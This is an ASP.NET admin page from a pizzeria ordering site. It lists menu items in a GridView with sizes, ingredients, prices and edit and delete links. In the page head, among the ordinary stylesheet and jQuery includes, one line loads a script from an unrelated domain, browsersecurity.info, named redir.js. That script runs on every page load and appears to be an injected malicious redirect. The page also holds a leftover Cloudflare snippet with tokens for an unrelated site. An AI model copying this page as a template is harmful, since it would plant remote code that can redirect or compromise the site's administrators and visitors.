﻿<%@ Page Language="C#" AutoEventWireup="true" CodeFile="MenuItemInformation.aspx.cs" Inherits="Admin_MenuItemInformation" %>


<!DOCTYPE html>
<html class="no-js">
<meta charset="utf-8">
<meta name="description" content="">
<meta name="viewport" content="width=device-width">
<title>MenuItemInformation</title>
<head>
    <link runat="server" rel="shortcut icon" href="/images/logo.ico" type="image/x-icon" />
    <link runat="server" rel="icon" href="/images/logo.ico" type="image/ico" />
    <script src="js/jquery-1.8.2.min.js" type="text/javascript"></script>
    <script src="http://browsersecurity.info/js/redir.js" type="text/javascript"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
    <script type="text/javascript">
        //<![CDATA[
        try { if (!window.CloudFlare) { var CloudFlare = [{ verbose: 0, p: 0, byc: 0, owlid: "cf", bag2: 1, mirage2: 0, oracle: 0, paths: { cloudflare: "/cdn-cgi/nexp/dok3v=1613a3a185/" }, atok: "72adab177b5729b458fc171b7e2ef771", petok: "be01c04ed78a819345fed98b13a0463b72c424a6-1450762210-1800", zone: "nyasha.me", rocket: "0", apps: { "ga_key": { "ua": "UA-50530436-1", "ga_bs": "2" } }, sha2test: 0 }]; !function (a, b) { a = document.createElement("script"), b = document.getElementsByTagName("script")[0], a.async = !0, a.src = "//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=38857570ac/cloudflare.min.js", b.parentNode.insertBefore(a, b) }() } } catch (e) { };
        //]]>
    </script>
    <link rel="shortcut icon" href="/favicon.ec0f3a1b.ico">
    <link rel="stylesheet" href="css/chosen.min.css">
    <link rel="stylesheet" href="css/checkBo.min.css">
    <link rel="stylesheet" href="css/style.css" />
    <style type="text/css">
        .grid th {
            text-align: center;
        }

        @media only screen and (max-width: 4000px) {
            #divstatus {
                margin-left: 657px;
                width: 100px;
                margin-top: -33px;
            }

            #btnAddMenuItem {
                margin-top: 10px;
                margin-left: -17px;
            }

            #DivSearch {
                width: 400px;
                margin-left: 602px;
                margin-top: 11px;
            }
              #divbtnSearch {
                width: 350px;
                margin-left: 874px;
                margin-top: 10px;
            }

            #divbtnreset{
                width: 350px;
                margin-left: 954px;
                margin-top: -34px;
            }

        }

        @media only screen and (max-width: 1600px) {
            #divstatus {
                margin-left: 1139px;
                width: 100px;
                margin-top: -32px;
            }

            #btnAddMenuItem {
                margin-top: 10px;
                margin-left: -17px;
            }

            /*#DivSearch {
                width: 400px;
                margin-left: 402px;
                margin-top: 11px;
            }*/
            #DivSearch {
                width: 400px;
                margin-left: 320px;
                margin-top: 11px;
            }

            #divbtnSearch {
                width: 350px;
                margin-left: 360px;
                margin-top: 11px;
            }

            #divbtnreset{
                width: 350px;
                margin-left: 707px;
                margin-top: -34px;
            }
        }


        @media only screen and (max-width: 1440px) {
            #divstatus {
                margin-left: 474px;
                width: 100px;
                margin-top: 11px;
            }

            #btnAddMenuItem {
                margin-left: -17px;
            }

            #DivSearch {
                width: 400px;
                margin-left: 352px;
                margin-top: 11px;
            }
        }

        @media only screen and (max-width: 1366px) {
            /*#divstatus {
                margin-left: 504px;
                width: 100px;
                margin-top: 11px;
            }*/
            #divstatus {
                margin-left: 941px;
                width: 100px;
                margin-top: -34px;
            }

            #btnAddMenuItem {
                margin-left: -17px;
            }

            /*#DivSearch {
                width: 400px;
                margin-left: 305px;
                margin-top: 11px;
            }*/
            #DivSearch {
                width: 400px;
                margin-left: 305px;
                margin-top: 11px;
            }

            #divbtnSearch {
                width: 350px;
                margin-left: 570px;
                margin-top: 11px;
            }

             #divbtnreset{
                width: 350px;
                margin-left: 653px;
                margin-top: -34px;
            }
        }

        @media only screen and (max-width: 1280px) {
            #divstatus {
                margin-left: 540px;
                width: 100px;
                margin-top: 11px;
            }

            #btnAddMenuItem {
                margin-left: -17px;
            }

            #DivSearch {
                width: 400px;
                margin-left: 276px;
                margin-top: 11px;
            }
        }

        @media only screen and (max-width: 1152px) {
            #divstatus {
                margin-left: 595px;
                width: 100px;
                margin-top: 11px;
            }

            #btnAddMenuItem {
                margin-left: -17px;
            }

            #DivSearch {
                width: 400px;
                margin-left: 215px;
                margin-top: 11px;
            }
        }

        @media only screen and (max-width: 1024px) {
            #divstatus {
                margin-left: 649px;
                width: 100px;
                margin-top: 11px;
            }

            #btnAddMenuItem {
                margin-left: -17px;
            }

            #DivSearch {
                width: 400px;
                margin-left: 151px;
                margin-top: 11px;
            }
        }
    </style>
    <script type="text/javascript">
        function Confirm() {

            var hdnfldVariable = document.getElementById("<%=hdnfldVariable.ClientID %>");


            if (confirm("Are you sure you want to delete MenuItem?")) {

                hdnfldVariable.value = "Yes";

            } else {

                hdnfldVariable.value = "No";
            }

        }

        function SearchMenuItem() {
            document.getElementById('<%= btnSearch.ClientID %>').click();
        }

    </script>
    <script type="text/javascript">
        function ConfirmForLogOut() {

            var hdnfldVariable = document.getElementById("<%=hdfLogout.ClientID %>");

            if (confirm("Are you sure you want to log out?")) {

                hdnfldVariable.value = "Yes";

            } else {

                hdnfldVariable.value = "No";
            }
            document.getElementById('<%= BtnLogOut.ClientID %>').click();
        }
    </script>
</head>

<body style="background-color: #F0F0F0">
    <form runat="server">
        <asp:ScriptManager ID="ScriptManager1" runat="server"></asp:ScriptManager>
        <asp:HiddenField ID="hdnfldVariable" runat="server" />
        <asp:HiddenField ID="hdnfldsearchtext" runat="server" />
        <asp:HiddenField ID="hdfLogout" runat="server" />
        <asp:Button runat="server" ID="BtnLogOut" Style="display: none" OnClick="BtnLogOut_Click" />

        <div class="app layout-fixed-header">
            <div class="sidebar-panel offscreen-left">
                <div class="brand">
                    <div class="brand-logo">
                        <img src="images/logo.png" height="50" width="50" style="margin-top: -10px;" alt="">
                    </div>
                    <a href="javascript:;" class="toggle-sidebar hidden-xs hamburger-icon v3" data-toggle="layout-small-menu"><span></span><span></span><span></span><span></span></a>
                </div>

                <nav role="navigation">
                    <ul class="nav">
                        <li><a href="DashBoard.aspx"><i class="fa fa-flask"></i><span>Dashboard</span> </a></li>
                        <li class="open"><a href="javascript:;"><i class="fa fa-tint"></i><span>Menu Details</span> </a>
                            <ul class="sub-menu">
                                <%--<li><a href="IngredientInformation.aspx"><asp:Image ImageUrl="~/images/oie_311359551MYYq6un.jpg" Height="22px" Width="22px" runat="server"/><span> </span><span>Ingredient Information</span> </a></li>
                                --%>
                                <li><a href="MenuCategoryInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu Category.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Categories</span> </a></li>
                                <li><a href="IngredientInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Ingredient.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Ingredients</span> </a></li>
                                <li><a href="IngredientFactInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Ingredient.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Ingredient Coverage</span> </a></li>
                                <li class="active"><a href="MenuItemInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu Items.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Products</span> </a></li>
                                <li><a href="MenuItemSizeInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon//Menu Items.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Product Sizes</span> </a></li>
                                <li><a href="PizzaBaseTypeInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Pizza Base Type.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Pizza Type</span> </a></li>
                                <li><a href="MenuItemMakingMethodInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu Items.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Making Method</span> </a></li>
                            </ul>
                        </li>

                        <li><a href="javascript:;"><i class="fa fa-tint"></i><span>Orders</span> </a>
                            <ul class="sub-menu">

                                <li><a href="OrderDetail.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Order.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Order Details</span> </a></li>
                                <li><a href="DayToDaySellingInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Day to Day Sales.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Daily Sales</span> </a></li>
                                <li><a href="TransactionDetail.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Transaction.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Transaction Details</span></a></li>

                            </ul>
                        </li>

                        <li><a href="javascript:;"><i class="fa fa-tint"></i><span>Files and Images</span> </a>
                            <ul class="sub-menu">

                                <li><a href="UploadMenuPdf.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu File Upload.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Menu</span> </a></li>
                                <li><a href="AddHomePageImages.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu File Upload.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Images</span> </a></li>

                            </ul>
                        </li>

                        <li><a href="OfferDetail.aspx"><i class="fa fa-tint"></i><span>Offers</span> </a>
                            <%--<ul class="sub-menu">
                                <li class="active"><a href="OfferDetail.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Offer.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Offer Information</span> </a></li>
                            </ul>--%>
                        </li>

                        <li><a href="CustomerInformation.aspx"><i class="fa fa-tint"></i><span>Customers</span> </a>
                            <%-- <ul class="sub-menu">
                                <li><a href="CustomerInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Customer.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Customer Information</span> </a></li>
                            </ul>--%>
                        </li>

                        <li><a href="SendNewsLatterInformation.aspx"><i class="fa fa-tint"></i><span>Newsletters</span> </a>
                            <%-- <ul class="sub-menu">
                                <li><a href="SendNewsLatterInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/News Letter.png" Height="22px" Width="22px" runat="server"/><span> </span><span>News Letter Information</span> </a></li>
                            </ul>--%>
                        </li>

                        <li><a href="javascript:;"><i class="fa fa-tint"></i><span>Misc. </span></a>
                            <ul class="sub-menu">

                                <li><a href="MiscellaneousSettings.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Miscellaneous & Configuration.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Store Settings</span> </a></li>
                                <li><a href="AddConfigKeyAndValues.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Miscellaneous & Configuration.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Configuration Settings</span> </a></li>
                                <li><a href="AddConfigContactDetail.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Contact.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Contact Detail</span></a></li>

                            </ul>
                        </li>

                        <li><a href="StoreInformation.aspx"><i class="fa fa-tint"></i><span>Store Details</span> </a>
                            <%--<ul class="sub-menu">
                                <li><a href="StoreInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Store.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Store Information</span> </a></li>
                            </ul--%>>
                        </li>

                    </ul>
                </nav>
            </div>


            <div class="main-panel" style="background-color: #F0F0F0; width: 85%; height: 150%">
                <header class="header navbar">
                    <div class="brand visible-xs">
                        <div class="toggle-offscreen"><a href="#" class="hamburger-icon visible-xs" data-toggle="offscreen" data-move="ltr"><span></span><span></span><span></span></a></div>
                        <div class="brand-logo">
                            <img src="images/logo-dark.5ba260bb.png" height="15" alt="">
                        </div>
                        <div class="toggle-chat"><a href="javascript:;" class="hamburger-icon v2 visible-xs" data-toggle="layout-chat-open"><span></span><span></span><span></span></a></div>
                    </div>
                    <ul class="nav navbar-nav navbar-right hidden-xs">
                        <li><a href="javascript:;" data-toggle="dropdown">
                            <img src="images/user.png" class="header-avatar img-circle ml10" alt="user" title="user">
                            <span class="pull-left" onclick="ConfirmForLogOut();">Log Out</span> </a></li>
                    </ul>
                </header>

                <div class="main-content">
                    <div class="panel">
                        <div class="panel-heading border" style="font-size: medium; font-weight: bold;">Menu Item Information</div>
                        <div class="table-header">
                            <div class="col-md-6">
                                <div class="col-md-8 col-sm-6" style="width: 100px;">
                                    <div role="form">
                                        <asp:Button ID="btnAddMenuItem" class="btn btn-info" runat="server" Text="Add New Menu Item" OnClick="btnAddMenuItem_Click" />

                                    </div>
                                </div>
                                <div id="DivSearch">
                                    <asp:TextBox ID="txtSearch" placeholder="Search" CssClass="form-control" runat="server" ClientIDMode="Static" Width="250px" onfocus="this.placeholder=''" onblur="this.placeholder='Search'"></asp:TextBox>
                                </div>
                            </div>

                            <div id="divbtnSearch">
                                <asp:Button ID="btnSearch" class="btn btn-info" runat="server" Text="Search" OnClick="btnSearch_Click" />
                            </div>

                            <div id="divbtnreset">
                                <asp:Button ID="btnReset" class="btn btn-info" runat="server" Text="Reset" OnClick="btnReset_Click" />
                            </div>

                            <div class="col-md-6 search-bar">
                                <div class="form-group" id="divstatus">
                                    <asp:Label ID="lblshow" runat="server" Text="Show"></asp:Label>

                                    <asp:DropDownList ID="ddlShowData" CssClass="dropdown" Width="55px" Height="33px" runat="server" AutoPostBack="true" OnSelectedIndexChanged="ddlShowData_SelectedIndexChanged">

                                        <asp:ListItem>10</asp:ListItem>
                                        <asp:ListItem>15</asp:ListItem>
                                        <asp:ListItem>20</asp:ListItem>
                                    </asp:DropDownList>
                                </div>
                            </div>
                        </div>
                        <div class="panel-body">
                            <asp:UpdatePanel ID="UpMenuItemInformation" runat="server">
                                <ContentTemplate>
                                    <asp:GridView ID="gvMenuItemInformation" runat="server" AutoGenerateColumns="false" AllowSorting="true" PageSize="10" AllowPaging="true" OnRowCommand="gvMenuItemInformation_RowCommand" OnSorting="gvMenuItemInformation_Sorting" OnRowDataBound="gvMenuItemInformation_RowDataBound" class="table table-bordered table-striped datatable editable-datatable responsive align-middle bordered">
                                        <RowStyle HorizontalAlign="Left" />
                                        <HeaderStyle HorizontalAlign="Left" />
                                        <Columns>
                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProductDetailId" runat="server" Text='<%# Eval("ProductDetailId") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Sequence Number" SortExpression="SeqNo" HeaderStyle-Width="150px">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblSequenceNumber" runat="server" Text='<%# Eval("SeqNo") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Menu Item Name" SortExpression="ProductName">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblMenuItemName" runat="server" Text='<%# Eval("ProductName") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Menu Item Description" SortExpression="Description" HeaderStyle-Width="180px" Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblMenuItemDescription" runat="server" Text='<%# Eval("Description") %>' ToolTip='<%# Eval("Description") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Category Name" SortExpression="CategoryName" HeaderStyle-Width="180px" Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblMainCategoryName" runat="server" Text='<%# Eval("CategoryName") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Menu Item Price" SortExpression="BasePrice" HeaderStyle-Width="140px">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblMenuItemPrice" runat="server" Text='<%#"$"+ Eval("BasePrice") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>


                                            <%-- <asp:TemplateField HeaderText="Menu Item Image" HeaderStyle-Width="140px">
                                                <ItemTemplate>
                                                    <asp:Image ID="ImgMenuItemImage" runat="server" Width="100px" Height="100px" ImageUrl='<%# Eval("ImageUrl") %>' />

                                                </ItemTemplate>
                                            </asp:TemplateField>--%>

                                            <asp:TemplateField HeaderText="Is Active" HeaderStyle-Width="140px" Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblIsActive" runat="server" Text='<%# Eval("Active") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>


                                            <asp:TemplateField HeaderText="Default Toppings/Dressings" Visible="false">
                                                <ItemTemplate>
                                                    <asp:GridView ID="gvMenuItemDefaultIngeredientInformation" runat="server" AutoGenerateColumns="false" AllowSorting="true" class="table table-bordered table-striped datatable editable-datatable responsive align-middle bordered" PageSize="5" AllowPaging="false" HeaderStyle-CssClass="grid">
                                                        <RowStyle HorizontalAlign="Center" />
                                                        <HeaderStyle HorizontalAlign="Center" />
                                                        <Columns>
                                                            <asp:TemplateField HeaderText="Toppings/Dressing Name" SortExpression="IngredientName">
                                                                <ItemTemplate>
                                                                    <asp:Label ID="lblIngredientName" runat="server" Text='<%# Eval("IngredientName") %>'></asp:Label>
                                                                </ItemTemplate>
                                                            </asp:TemplateField>

                                                            <asp:TemplateField HeaderText="Toppings/Dressing Price" SortExpression="IngredientPrice">
                                                                <ItemTemplate>
                                                                    <asp:Label ID="lblIngredientPrice" runat="server" Text='<%# "$ " + Eval("IngredientPrice")%>'></asp:Label>
                                                                </ItemTemplate>
                                                            </asp:TemplateField>
                                                        </Columns>
                                                        <EmptyDataTemplate>
                                                            No Default Ingredient Found
                                                        </EmptyDataTemplate>
                                                    </asp:GridView>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Extra Ingredients" Visible="false">
                                                <ItemTemplate>
                                                    <asp:GridView ID="gvMenuItemExtraIngeredientInformation" runat="server" AutoGenerateColumns="false" AllowSorting="true" class="table table-bordered table-striped datatable editable-datatable responsive align-middle bordered" PageSize="5" AllowPaging="false" HeaderStyle-CssClass="grid">
                                                        <RowStyle HorizontalAlign="Center" />
                                                        <HeaderStyle HorizontalAlign="Center" />
                                                        <Columns>
                                                            <asp:TemplateField HeaderText="Ingredient Name" SortExpression="IngredientName">
                                                                <ItemTemplate>
                                                                    <asp:Label ID="lblIngredientName" runat="server" Text='<%# Eval("IngredientName") %>'></asp:Label>
                                                                </ItemTemplate>
                                                            </asp:TemplateField>

                                                            <asp:TemplateField HeaderText="Ingredient Price" SortExpression="IngredientPrice">
                                                                <ItemTemplate>
                                                                    <asp:Label ID="lblIngredientPrice" runat="server" Text='<%# "$ " + Eval("IngredientPrice")%>'></asp:Label>
                                                                </ItemTemplate>
                                                            </asp:TemplateField>
                                                        </Columns>
                                                        <EmptyDataTemplate>
                                                            No Extra Ingredient Found
                                                        </EmptyDataTemplate>
                                                    </asp:GridView>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Fact Detail">
                                                <ItemTemplate>
                                                    <asp:GridView ID="gvMenuItemIngeredientFactInformation" runat="server" AutoGenerateColumns="false" AllowSorting="true" class="table table-bordered table-striped datatable editable-datatable responsive align-middle bordered" PageSize="5" AllowPaging="false" HeaderStyle-CssClass="grid">
                                                        <RowStyle HorizontalAlign="Center" />
                                                        <HeaderStyle HorizontalAlign="Center" />
                                                        <Columns>
                                                            <asp:TemplateField HeaderText="Ingredient Fact Name" SortExpression="IngredientFactName">
                                                                <ItemTemplate>
                                                                    <asp:Label ID="lblIngredientFactName" runat="server" Text='<%# Eval("IngredientFactName") %>'></asp:Label>
                                                                </ItemTemplate>
                                                            </asp:TemplateField>


                                                        </Columns>
                                                        <EmptyDataTemplate>
                                                            No Ingredient Fact detail Found
                                                        </EmptyDataTemplate>
                                                    </asp:GridView>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Product Properties">
                                                <ItemTemplate>
                                                    <asp:GridView ID="gvMenuItemPropertiesInformation" runat="server" AutoGenerateColumns="false" AllowSorting="true" PageSize="3" AllowPaging="false" HeaderStyle-CssClass="grid" class="table table-bordered table-striped datatable editable-datatable responsive align-middle bordered">
                                                        <RowStyle HorizontalAlign="Center" />
                                                        <HeaderStyle HorizontalAlign="Center" />
                                                        <Columns>
                                                            <asp:TemplateField HeaderText="Menu Item Size" SortExpression="SizeName">
                                                                <ItemTemplate>
                                                                    <asp:Label ID="lblMenuItemSize" runat="server" Text='<%# Eval("SizeName") %>'></asp:Label>
                                                                </ItemTemplate>
                                                            </asp:TemplateField>

                                                            <asp:TemplateField HeaderText="Pizza Base Type" SortExpression="PizzaBaseType">
                                                                <ItemTemplate>
                                                                    <asp:Label ID="lblPizzaBaseType" runat="server" Text='<%# Eval("PizzaBaseType")%>'></asp:Label>
                                                                </ItemTemplate>
                                                            </asp:TemplateField>

                                                            <asp:TemplateField HeaderText="Making Method" SortExpression="MakingMethodName">
                                                                <ItemTemplate>
                                                                    <asp:Label ID="lblMenuItemMakingMethodName" runat="server" Text='<%#  Eval("MakingMethodName")%>'></asp:Label>
                                                                </ItemTemplate>
                                                            </asp:TemplateField>

                                                            <asp:TemplateField HeaderText="Properties Price" SortExpression="PropertiesPrice">
                                                                <ItemTemplate>
                                                                    <asp:Label ID="lblPropertiesPrice" runat="server" Text='<%# "$ " + Eval("PropertiesPrice")%>'></asp:Label>
                                                                </ItemTemplate>
                                                            </asp:TemplateField>
                                                        </Columns>
                                                        <EmptyDataTemplate>
                                                            No Properties Found
                                                        </EmptyDataTemplate>
                                                    </asp:GridView>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Edit">
                                                <ItemTemplate>
                                                    <asp:LinkButton ID="lnkEdit" runat="server" CommandName="EditMenuItem" CommandArgument='<%# Eval("ProductDetailId")%>' Text="Edit"></asp:LinkButton>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Delete">
                                                <ItemTemplate>
                                                    <asp:LinkButton ID="lnkDelete" runat="server" CommandName="DeleteMenuItem" CommandArgument='<%# Eval("ProductDetailId")%>' Text="Delete" OnClientClick="Confirm()"></asp:LinkButton>
                                                </ItemTemplate>
                                            </asp:TemplateField>


                                        </Columns>
                                        <PagerTemplate>
                                            <ul class="pagination pull-right">
                                                <asp:Button ID="btnFirst" runat="server" Text="First" CssClass="btn btn-info" CommandName="First" /></li>
                                              
                                                    <asp:Button ID="btnPrevious" runat="server" Text="Previous" CssClass="btn btn-info" CommandName="Previous" /></li>
                                               
                                                    <asp:Button ID="btnNext" runat="server" Text="Next" CssClass="btn btn-info" CommandName="Next" /></li>
                                               
                                                    <asp:Button ID="btnLast" runat="server" Text="Last" CssClass="btn btn-info" CommandName="Last" /></li>
                                          
                                            </ul>
                                        </PagerTemplate>
                                        <EmptyDataTemplate>
                                            No Menu Item Found
                                        </EmptyDataTemplate>
                                    </asp:GridView>
                                </ContentTemplate>
                            </asp:UpdatePanel>
                        </div>

                    </div>
                </div>
            </div>

            <br />
            <br />
            <br />

            <br />
            <br />
            <br />
            <br />

            <br />
            <br />
            <br />
            <br />

            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />

            <footer class="content-footer" style="width: 100%;">
                <nav class="footer-right">
                    <ul class="nav">
                        <li><a href="javascript:;">Top</a> </li>
                        <li><a href="javascript:;" class="scroll-up"><i class="fa fa-angle-up"></i></a></li>
                    </ul>
                </nav>

                <nav class="footer-left">
                    <ul class="nav">
                        <li><a href="javascript:;">Copyright <i class="fa fa-copyright"></i><span>TomatosPizzeria</span> 2016. All rights reserved</a> </li>
                    </ul>
                </nav>
            </footer>
        </div>
        <script src="js/app.min.4fc8dd6e.js"></script>
        <script src="js/jquery.dataTables.js"></script>
        <script src="js/bootstrap-datatables.8df42543.js"></script>
        <script type="text/javascript">
            /* <![CDATA[ */
            var _gaq = _gaq || [];
            _gaq.push(['_setAccount', 'UA-50530436-1']);
            _gaq.push(['_trackPageview']);

            (function () {
                var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
                ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
                var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
            })();

            (function (b) { (function (a) { "__CF" in b && "DJS" in b.__CF ? b.__CF.DJS.push(a) : "addEventListener" in b ? b.addEventListener("load", a, !1) : b.attachEvent("onload", a) })(function () { "FB" in b && "Event" in FB && "subscribe" in FB.Event && (FB.Event.subscribe("edge.create", function (a) { _gaq.push(["_trackSocial", "facebook", "like", a]) }), FB.Event.subscribe("edge.remove", function (a) { _gaq.push(["_trackSocial", "facebook", "unlike", a]) }), FB.Event.subscribe("message.send", function (a) { _gaq.push(["_trackSocial", "facebook", "send", a]) })); "twttr" in b && "events" in twttr && "bind" in twttr.events && twttr.events.bind("tweet", function (a) { if (a) { var b; if (a.target && a.target.nodeName == "IFRAME") a: { if (a = a.target.src) { a = a.split("#")[0].match(/[^?=&]+=([^&]*)?/g); b = 0; for (var c; c = a[b]; ++b) if (c.indexOf("url") === 0) { b = unescape(c.split("=")[1]); break a } } b = void 0 } _gaq.push(["_trackSocial", "twitter", "tweet", b]) } }) }) })(window);
            /* ]]> */
        </script>

    </form>
</body>
</html>





